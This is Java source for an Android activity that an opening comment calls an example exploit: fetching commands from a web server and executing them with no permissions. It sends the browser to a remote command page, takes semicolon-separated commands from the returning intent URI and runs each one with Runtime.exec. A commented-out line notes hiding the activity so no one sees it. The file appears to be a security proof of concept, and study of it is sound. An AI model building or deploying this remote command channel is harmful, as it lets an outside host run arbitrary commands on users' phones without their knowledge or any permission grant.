package de.macmark.android;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.TextView;

//Fetching commands from a web server and executing them. No permissions necessary.
//For more informations take a look at http://www.macmark.de/android.php#example_exploit2

public class CmdDroidActivity extends Activity {

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {

		try {
			super.onCreate(savedInstanceState);
			//        setContentView(R.layout.main);
			Log.e("mycommand", "Here I'm. With intent action = " + getIntent().getAction());
			if (getIntent().getAction().equals("android.intent.action.MAIN")) {
				Log.e("mycommand", "first call/start" + getIntent().toURI());
				startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.macmark.de/command.php")));
			}
			else if (getIntent().getAction().equals("android.intent.action.VIEW")) {
				TextView tv = new TextView(this);
				tv.setMovementMethod(new ScrollingMovementMethod());
				setContentView(tv);
				StringBuffer output;


				Log.e("mycommand", "2nd call, URI: " + getIntent().toURI());
				String commandSeries = getIntent().toURI();
				String[] commands = commandSeries.split("_");
				String allCmds = commands[1];
				Log.e("all commands","allCmds = " + allCmds);
				String[] commandos = allCmds.split(";");
				for (int i=0; i<commandos.length; i++ ) {
					output = new StringBuffer();
					String com = commandos[i];
					Log.e("single command encoded","com = " + com);
					com = com.replaceAll(",", " ");
					Log.e("single command decoded","com = " + com);

					// Executes the command.
					Process process = Runtime.getRuntime().exec(com);

					// Reads stdout.
					// NOTE: You can write to stdin of the command using
					//       process.getOutputStream().
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(process.getInputStream()));
					int read;
					char[] buffer = new char[4096];
					while ((read = reader.read(buffer)) > 0) {
						output.append(buffer, 0, read);
					}
					reader.close();

					// Waits for the command to finish.
					process.waitFor();

					tv.append("Your wish is my command.\r\n");
					tv.append("\r\n" + com + "\r\n" + output + "\r\n\r\n");
				}
				//			finish(); // So no one ever sees this activity
			}

		} catch (IOException e) {
			throw new RuntimeException(e);
		} catch (InterruptedException e) {
			throw new RuntimeException(e);
		}

	}
}